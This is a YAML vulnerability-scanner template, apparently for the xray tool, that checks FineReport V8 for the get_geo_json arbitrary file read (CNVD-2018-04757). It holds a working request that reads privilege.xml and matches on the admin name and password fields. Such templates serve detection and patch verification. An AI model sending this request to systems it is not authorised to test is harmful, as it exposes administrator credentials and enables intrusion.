name: poc-yaml-finereport-v8-get-geo-json-readfile
binding: 65c3bf52-4efd-4d80-8d0c-4ddeb84d2504
detail:
    author: chaitin
    links:
        - http://wiki.peiqi.tech/wiki/oa/%E5%B8%86%E8%BD%AFOA/%E5%B8%86%E8%BD%AF%E6%8A%A5%E8%A1%A8%20V8%20get_geo_json%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CNVD-2018-04757.html
transport: http
rules:
    r0:
        request:
            method: GET
            path: /WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
            follow_redirects: false
        expression: response.status == 200 && (response.body.bcontains(b"PrivilegeManager") || response.body.bcontains(b"rootManagerName") || response.body.bcontains(b"rootManagerPassword")) && response.body.bcontains(b"<?xml")
expression: r0()
